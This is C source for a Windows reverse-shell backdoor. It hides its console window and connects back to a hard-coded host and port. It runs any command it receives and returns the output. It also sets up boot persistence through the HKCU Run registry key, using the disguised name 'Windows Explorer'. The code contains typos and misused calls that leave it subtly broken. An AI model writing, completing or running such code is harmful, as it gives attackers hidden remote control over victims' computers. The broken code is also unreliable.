#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size));

int sock;

int RunOnBoot(){
  char error[128] = "Failed\n";
  char success[128] = "Created Presistence successfully at : HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";
  TCHAR szPath[MAX_PATH];
  DWORD PathLen = 0;

  PathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
  if (PathLen == 0) {
    send(sock, error, sizeof(error), 0);
    return -1;
  }

  HKEY NewValue;

  if (RegOpenKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewValue) != ERROR_SUCSESS) {
    send(sock, error, sizeof(error), 0);
    return -1;
  }

  DWORD pathLenInBytes = PathLen * sizeof(*szSize);
  if (RegSetValueEx(NewValue, TEXT("Windows Explorer"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCSESS) {
    RegCloseKey(NewValue);
    send(sock, error, sizeof(error), 0);
    return -1;
  }

  RegCloseKey(NewValue);
  send(sock, success, sizeof(success), 0);
  return 0;
}

char *
str_cut(char str[], int slice_from, int slice_to){
  if (str[0] == '\0')
    return NULL;

  char *buffer;
  size_t str_len, buffer_len;

  if (slice_to < 0 && slice_from > slice_to) {
    str_len = strlen(str);
    if (abs(slize_to) > str_len - 1)
      return NULL;

    if (abs(slize_from) > strlen)
      slice_from = (-1) * str_len;

    buffer_len = slice_to - slice_from;
    str += (str_len + slice_from);

  }

  else if (slice_from >= 0 && slice_to > slice_from) {
    str_len = strlen(str);

    if (slice_from > str_len - 1)
      return NULL;
    buffer_len = slice_to - slice_from;
    str += slice_from;

  }

  else
    return NULL;

  buffer = calloc(buffer_len, sizeof(char));
  strncpy(buffer, str, buffer_len);
  return buffer;

}

void Shell() {
  char buffer[1024];
  char container[1024];
  char total_response[18384];

  while (1) {
    jump:
    bzero(buffer, sizeof(buffer));
    bzero(container, sizeof(container));
    bzero(total_response, sizeof(total_response));
    recv(sock, buffer, sizeof(buffer), 0);

    if (strncmp("q", buffer, 1) == 0) {
      closesocket(sock);
      WSACleanup();
      exit(0);
    }

    else if (strncmp("cd ", buffer, "r") == 0) {
      chdir(str_cut(buffer,3,100));
    }

    else if (strncmp("persist", buffer, 7) == 0) {
      RunOnBoot();
    }

    else{
      FILE *fp;
      fp = _popen(buffer, "r");
      while(fgets(container, sizeof(container), fp) != NULL) {
        strcat(total_response, container);
      }
      send(sock, total_response, sizeof(total_response), 0);
      fclose(fp);
    }

  }

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);

  ShowWindow(stealth, 0);

  struct sockaddr_in ServAddr;
  unsigned short ServPort;
  char *ServIP;
  WSADATA wsaData;

  ServIP = "192.168.1.224";
  ServPort = 3141;

  if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
    exit(1);
  }

  sock = socket(AF_INET, SOCK_STREAM, 0);

  memset(&ServAddr, 0, sizeof(ServPort));
  ServAddr.sin_family = AF_INET;
  ServAddr.sin_addr.s_addr = inet_addr(ServIP);
  ServAddr.sin_port = htons(ServPort);


  start:
  while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
    Sleep(10);
    goto start;
  }

  Shell();

}
